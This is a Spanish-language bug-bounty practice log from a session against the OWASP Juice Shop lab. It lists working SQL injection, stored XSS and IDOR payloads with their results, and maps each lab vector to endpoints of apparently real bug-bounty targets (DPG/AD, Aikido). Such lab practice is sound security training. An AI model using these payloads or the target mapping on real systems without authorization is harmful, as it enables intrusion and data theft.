# Practica Multi-Vector — OWASP Juice Shop (mrpuff0420) — Sesion 2

LAB LOCAL, sin RoE/PII. Entrena SQLi, Stored XSS, Auth bypass para DPG/AD y Aikido.

## Resultados (2026-08-09)
| Vector | Payload | Resultado | Severity en programa real |
|---|---|---|---|
| SQLi search | `')) UNION SELECT sql,'2'..'9' FROM sqlite_master--` | **200, schema leak** (CREATE TABLE en respuesta) | DPG: SQLi = Critical |
| Stored XSS | POST /api/Products `{"description":"<iframe src=javascript:alert(1)>"}` | 201 guardado; verify no encontro iframe en search (sanitizer filtra) | DPG webwinkel: High |
| IDOR/BOLA | GET /api/Users/{id} con token customer | 200 datos de admin/id=1 | DPG consent / Aikido accounts |
| Auth bypass | remember-me cookie -> email header spoof | concepto (requiere browser manual) | DPG myaccount: High |

## Lecciones
1. SQLi UNION: encontrar nº columnas por trial-error (3..9). SQLite usa sqlite_master.
2. Stored XSS: guardar (201) NO = exploitable. Hay que confirmar render sin sanitizer.
   - En real: probar mXSS (CVE-2024-47875 DOMPurify), DOM clobbering, prototype pollution.
3. IDOR: usar SIEMPRE 2 cuentas propias para demostrar impacto (no ajenas reales).
4. Throttle 0.3s (<=5 req/seg) respetado en todos los scripts.

## Scripts en /data/bugbounty/scripts/
- juice_practice.py (register/login/JWT)
- juice_idor.py (IDOR/BOLA)
- juice_multivector.py (SQLi + Stored XSS + auth bypass concept)
- recon_browser.py (WAF real, header Intigriti) — para reales
- manual_probe.py (request dirigido throttle)

## Mapping a reales
| Juice (lab) | DPG/AD | Aikido |
|---|---|---|
| /rest/products/search?q= SQLi | buscadores/filtros AD | filters en /api/... |
| /api/Products XSS | webwinkel reviews/perfil | tenant content |
| /api/Users/{id} IDOR | /api/consent?authId= | /api/accounts/getAccountDetails |
| remember-me auth bypass | myaccount login flow | app.aikido.dev auth |
